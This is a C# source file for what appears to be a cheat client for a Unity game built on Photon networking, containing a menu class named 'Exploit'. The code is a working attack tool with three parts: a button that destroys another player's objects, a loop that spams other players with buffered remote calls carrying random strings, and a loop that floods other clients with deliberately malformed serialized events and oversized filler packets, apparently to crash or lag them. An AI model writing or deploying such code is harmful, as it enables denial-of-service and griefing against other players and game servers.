using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Pun.Simple.Internal;
using Photon.Realtime;
using RoundWare.SDK;
using RoundWare.SDK.UI;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UnityEngine;

namespace RoundWare.Modules
{
    [Menu("Exploit")]
    internal class Exploit : BaseMenu
    {
        bool eventSpam, genTwo;

        public Exploit(string text) : base(text)
        {
        }

        [Button("Destroy")]
        public void DestroyAll()
        {
            PhotonNetwork.DestroyPlayerObjects(PlayerHelper.Players.Last().playerID, false);
        }

        [Toggle("Gen2V2")]
        public void GenTwo(bool state)
        {
            genTwo = state;
            if (state)
            {
                Task.Run(() =>
                {
                    GenTwoLoop();
                });
            }
        }

        [Toggle("Gen2V1")]
        public void EventSpammer(bool state)
        {
            eventSpam = state;
            if (state)
            {
                Task.Run(() =>
                {
                    EventSpam();
                });
            }
        }

        private async void EventSpam()
        {
            while (eventSpam)
            {
                PhotonHelper.RPC("RPCA_CallCustomActionV2V2", RpcTarget.OthersBuffered, new object[]
                {
                    RandomString(820),Vector2.zero,Vector2.zero
                });
                await Task.Delay(200);
            }
        }

        private async void GenTwoLoop()
        {
            System.Random r = new System.Random();
            while (genTwo)
            {
                byte[] array = Generate(r);
                int num = r.Next(12, 17);
                int num2 = r.Next(7, num - 3);
                for (int i = 0; i < num; i++)
                {
                    PhotonHelper.OpRaiseEvent(200, ((i == num2) ? array : ((r.Next(0, 10) < 5) ? Filler(r) : FakeData(r))), new RaiseEventOptions
                    {
                        CachingOption = EventCaching.DoNotCache
                    }, SendOptions.SendReliable);
                }
                await Task.Delay(200);
            }
        }

        byte[] Filler(System.Random r)
        {
            byte[] array = new byte[r.Next(1116, 2423)];
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = (byte)r.Next(0, 42);
            }
            return array;
        }

        byte[] Generate(System.Random r)
        {
            List<byte> list = new List<byte>();
            int num = r.Next(4000, 5000);
            byte[] array = new byte[5000];
            int num2 = 0;
            for (int i = 0; i < num; i++)
            {
                int num3 = r.Next(0, (i == 0) ? 15 : 18);
                if (num2 != 0 && array[num2 - 1] == 1)
                {
                    list.Add(240);
                }
                switch (num3)
                {
                    case 0:
                    case 1:
                    case 2:
                    case 3:
                    case 4:
                        array[num2++] = 0;
                        list.Add(122);
                        list.AddRange(ToBytes(RandomShort(r)));
                        break;
                    case 5:
                    case 6:
                    case 7:
                    case 8:
                    case 9:
                        array[num2++] = 1;
                        list.Add(101);
                        list.Add(200);
                        list.AddRange(ToBytes(RandomShort(r)));
                        break;
                    case 10:
                    case 11:
                    case 12:
                    case 13:
                    case 14:
                        array[num2++] = 2;
                        list.Add(104);
                        list.AddRange(ToBytes(RandomShort(r)));
                        break;
                    case 15:
                        {
                            list.Add(99);
                            list.Add(86);
                            list.AddRange(ToBytes(12));
                            byte[] array2 = new byte[12];
                            r.NextBytes(array2);
                            list.AddRange(array2);
                            break;
                        }
                    case 16:
                        {
                            list.Add(99);
                            list.Add(87);
                            list.AddRange(ToBytes(8));
                            byte[] array3 = new byte[8];
                            r.NextBytes(array3);
                            list.AddRange(array3);
                            break;
                        }
                    case 17:
                        {
                            list.Add(99);
                            list.Add(101);
                            list.AddRange(ToBytes(16));
                            byte[] array4 = new byte[16];
                            r.NextBytes(array4);
                            list.AddRange(array4);
                            break;
                        }
                }
            }
            return list.ToArray();
        }

        short RandomShort(System.Random r)
        {
            return (short)r.Next(16384, 32767);
        }

        byte[] ToBytes(short s)
        {
            return new byte[]
            {
                    (byte)(s >> 8),
                    (byte)(s & 255)
            };
        }

        private byte[] FakeData(System.Random r)
        {
            byte[] array = new byte[r.Next(7832, 14263)];
            int num = 0;
            array[num++] = 122;
            Protocol.Serialize(1, array, ref num);
            array[num++] = 120;
            Protocol.Serialize(array.Length - (num + 4), array, ref num);
            for (int i = num; i < array.Length; i++)
            {
                array[i] = (byte)r.Next(0, 77);
            }
            return array;
        }

        private string RandomString(int length)
        {
            char[] array = "abcdefghlijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789".ToArray();
            string text = string.Empty;
            System.Random random = new System.Random();
            for (int i = 0; i < length; i++)
            {
                text += array[random.Next(array.Length)].ToString();
            }
            return text;
        }
    }
}
